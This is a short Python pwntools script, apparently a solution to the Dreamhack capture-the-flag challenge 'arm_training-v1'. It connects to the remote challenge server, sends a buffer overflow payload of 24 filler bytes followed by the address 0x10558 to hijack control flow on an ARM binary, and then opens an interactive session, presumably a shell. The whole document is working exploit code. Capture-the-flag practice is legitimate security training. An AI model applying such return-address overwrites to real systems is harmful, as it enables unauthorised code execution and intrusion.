from pwn import *

p = remote('host3.dreamhack.games', 11040)
#p = process("./arm_training-v1")
context.arch = 'arm'

payload = b"a"*24 + p32(0x10558
)
p.send(payload)
p.interactive()

